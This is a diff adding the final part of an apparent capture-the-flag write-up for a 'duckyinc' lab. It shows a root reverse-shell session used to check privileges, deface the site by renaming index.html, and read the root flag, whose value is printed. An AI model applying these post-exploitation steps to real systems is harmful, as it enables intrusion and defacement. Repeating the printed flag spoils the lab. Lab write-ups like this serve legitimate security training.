@@ -285,3 +285,51 @@ step 3. restart duckyinc service
 server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
 server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
 ```  
+
+now we got reverce shell , and we can check privilege.
+```
+root@duckyinc:/var/www/duckyinc# whoami
+whoami
+root
+```
+
+step 4. find flag
+
+usualy, final flag will place /root dirctory
+```
+root@duckyinc:/var/www/duckyinc# ls /root
+ls /root
+```  
+
+we check flag3 hint is Mission objectives, in this story, we need to broke the web, so we change index.html name.
+
+```
+root@duckyinc:/var/www/duckyinc# cd templates
+cd templates
+root@duckyinc:/var/www/duckyinc/templates# ls
+ls
+404.html
+500.html
+admin.html
+base.html
+contact.html
+index.html
+login.html
+product.html
+products.html
+root@duckyinc:/var/www/duckyinc/templates# mv index.html index2.html
+mv index.html index2.html
+root@duckyinc:/var/www/duckyinc/templates# ls /root
+ls /root
+flag3.txt
+root@duckyinc:/var/www/duckyinc/templates# cat flag3
+cat flag3
+cat: flag3: No such file or directory
+root@duckyinc:/var/www/duckyinc/templates# cat flag3.txt
+cat flag3.txt
+cat: flag3.txt: No such file or directory
+root@duckyinc:/var/www/duckyinc/templates# cat /root/flag3.txt
+cat /root/flag3.txt
+thm{m1ss10n_acc0mpl1sh3d}
+root@duckyinc:/var/www/duckyinc/templates#
+```
